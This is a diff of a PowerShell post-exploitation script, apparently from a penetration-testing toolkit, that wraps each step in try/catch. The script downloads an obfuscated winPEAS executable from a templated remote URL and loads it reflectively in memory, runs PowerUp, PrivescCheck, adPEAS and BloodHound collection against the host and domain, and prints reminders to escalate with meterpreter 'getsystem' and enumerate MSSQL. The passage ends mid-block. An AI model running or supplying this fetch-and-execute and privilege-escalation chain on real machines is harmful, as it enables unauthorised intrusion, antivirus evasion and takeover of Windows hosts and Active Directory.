@@ -1,25 +1,32 @@
-systeminfo | tee systeminfo.txt
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url_1029384756/tools/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("log=$pwd/winpeas.txt")
-Invoke-HostRecon | tee hostrecon.txt
-Invoke-AllChecks | tee powerup.txt
-Invoke-PrivescCheck | tee privesccheck.txt
-Invoke-adPEAS | tee adpeas.txt
-Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -outputdirectory $pwd
+try {systeminfo | tee systeminfo.txt}
+catch {$_}
+try {$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url_1029384756/tools/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("log=$pwd/winpeas.txt")}
+catch {$_}
+try {Invoke-HostRecon | tee hostrecon.txt}
+catch {$_}
+try {Invoke-AllChecks | tee powerup.txt}
+catch {$_}
+try {Invoke-PrivescCheck | tee privesccheck.txt}
+catch {$_}
+try {Invoke-adPEAS | tee adpeas.txt}
+catch {$_}
+try {Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -outputdirectory $pwd}
+catch {$_}
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
+Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
 Write-Host -ForegroundColor Blue "(https://github.com/bitsadmin/wesng)"
 Write-Host -ForegroundColor Yellow "Download and check the systeminfo.txt with:"
 Write-Host -ForegroundColor DarkYellow "`twes --update && wes systeminfo.txt`n"
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
+Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
 Write-Host -ForegroundColor Yellow "Check every suspicious directory & file inside:"
-Write-Host -ForegroundColor DarkYellow "`tC:\Users`n`tC:\Program Files`n`tC:\"
+Write-Host -ForegroundColor DarkYellow "`tC:\Users`n`tC:\Program Files`n`tC:\`n"
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
+Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
 Write-Host -ForegroundColor Yellow "Try escalate with meterpreter:"
-Write-Host -ForegroundColor DarkYellow "`tload priv`n`tgetsystem"
+Write-Host -ForegroundColor DarkYellow "`tload priv`n`tgetsystem`n"
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
+Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER] --- "
 Write-Host -ForegroundColor Yellow "ENUMERATE MSSQL:"
 Write-Host -ForegroundColor DarkYellow @"
 Get-SQLInstanceLocal -Verbose
